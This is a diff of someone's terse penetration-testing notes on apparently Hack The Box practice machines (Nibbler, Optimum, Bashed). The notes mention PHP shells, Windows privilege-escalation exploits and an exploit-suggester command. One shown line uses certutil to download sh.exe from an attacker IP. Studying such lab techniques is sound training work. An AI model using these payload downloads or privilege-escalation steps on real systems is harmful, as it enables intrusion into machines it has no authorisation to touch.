@@ -144,3 +144,18 @@ for cred in $(cat file.txt);do echo -n $cred | base64; done    . example of 1 li
 
 certutil  -urlcache -f http://10.10.14.26/sh.exe   // download over certutil (WIN) 
 ### Nibbler
+
+sudo -l again. more php shells.
+
+### optimum
+using compiled winprivesc exploits ( ms16-32)
+win exploits 
+https://www.fuzzysecurity.com/tutorials/16.html
+python2 windows-exploit-suggester.py --database 2020-01-14-mssb.xls --systeminfo ../systeminfo.txt --quiet
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+not much different video from https://alamot.github.io/optimum_writeup/ 
+
+### Bashed
+
+
+
